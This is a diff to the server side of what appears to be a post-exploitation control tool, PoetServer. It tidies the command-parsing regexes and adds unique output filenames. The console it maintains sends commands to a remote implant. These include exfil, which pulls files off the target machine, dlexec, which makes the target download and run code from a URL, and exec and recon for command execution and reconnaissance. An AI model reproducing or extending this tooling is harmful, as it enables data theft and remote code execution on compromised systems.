@@ -79,14 +79,14 @@ class PoetServer(object):
                 # exec
                 elif base == self.cmds[2]:
                     inp += ' '  # for regex
-                    exec_regex = '^exec( -o( [\w.]+)?)? (("[^"]+")\ )+$'
+                    exec_regex = '^exec(\s+-o(\s+[\w.]+)?)?\s+(("[^"]+")\s+)+$'
                     if re.search(exec_regex, inp):
                         self.generic(*self.exec_preproc(inp))
                     else:
                         self.cmd_help(2)
                 # recon
                 elif base == self.cmds[3]:
-                    if re.search('^recon( -o( [\w.]+)?)?$', inp):
+                    if re.search('^recon(\s+-o(\s+[\w.]+)?)?$', inp):
                         if '-o' in inp.split():
                             if len(inp.split()) == 3:
                                 self.generic(base, True, inp.split()[2])
@@ -104,7 +104,7 @@ class PoetServer(object):
                         self.cmd_help(4)
                 # exfil
                 elif base == self.cmds[5]:
-                    if re.search('^exfil ([\w\/\\.~:\-]+ )+$', inp + ' '):
+                    if re.search('^exfil\s+([\w\/\\.~:\-]+\s+)+$', inp + ' ') and '-h' not in inp.split():
                         for file in inp.split()[1:]:
                             resp = self.conn.exchange('exfil ' + file)
                             if 'No such' in resp:
@@ -133,7 +133,7 @@ class PoetServer(object):
                         self.cmd_help(6)
                 # dlexec
                 elif base == self.cmds[7]:
-                    if re.search('^dlexec https?:\/\/[\w.\/]+$', inp):
+                    if re.search('^dlexec\s+https?:\/\/[\w.\/]+$', inp):
                         resp = self.conn.exchange(inp)
                         msg = 'successful' if resp == 'done' else 'error: ' + resp
                         print 'posh : dlexec {}'.format(msg)
@@ -141,7 +141,7 @@ class PoetServer(object):
                         self.cmd_help(7)
                 # chint
                 elif base == self.cmds[8]:
-                    if re.search('^chint( \d+)?$', inp):
+                    if re.search('^chint(\s+\d+)?$', inp):
                         self.chint(inp)
                     else:
                         self.cmd_help(8)
@@ -184,8 +184,10 @@ class PoetServer(object):
         """
 
         ts = datetime.now().strftime('%Y%m%d%M%S')
-        out_ts_dir = '{}/{}'.format(out_dir, ts[:len('20140101')])
+        out_ts_dir = '{}/{}'.format(out_dir, ts[:len('yyyymmdd')])
         out_prefix_dir = '{}/{}'.format(out_ts_dir, prefix)
+
+        # create filename to write to
         if write_file:
             chunks = write_file.split('.')
             # separate the file extension from the file name, default to .txt
@@ -193,12 +195,24 @@ class PoetServer(object):
             outfile = '{}/{}-{}{}'.format(out_prefix_dir, chunks[0], ts, ext)
         else:
             outfile = '{}/{}-{}.txt'.format(out_prefix_dir, prefix, ts)
+
+        # create directories if they don't exist
         if not os.path.isdir(out_dir):
             os.mkdir(out_dir)
         if not os.path.isdir(out_ts_dir):
             os.mkdir(out_ts_dir)
         if not os.path.isdir(out_prefix_dir):
             os.mkdir(out_prefix_dir)
+
+        # if file already exists, append unique digit to the end
+        if os.path.exists(outfile):
+            count = 1
+            orig_outfile = outfile
+            outfile = orig_outfile + '.{}'.format(count)
+            while os.path.exists(outfile):
+                outfile = orig_outfile + '.{}'.format(count)
+                count += 1
+
         with open(outfile, 'w') as f:
             f.write(response)
             print 'posh : {} written to {}'.format(prefix, outfile)
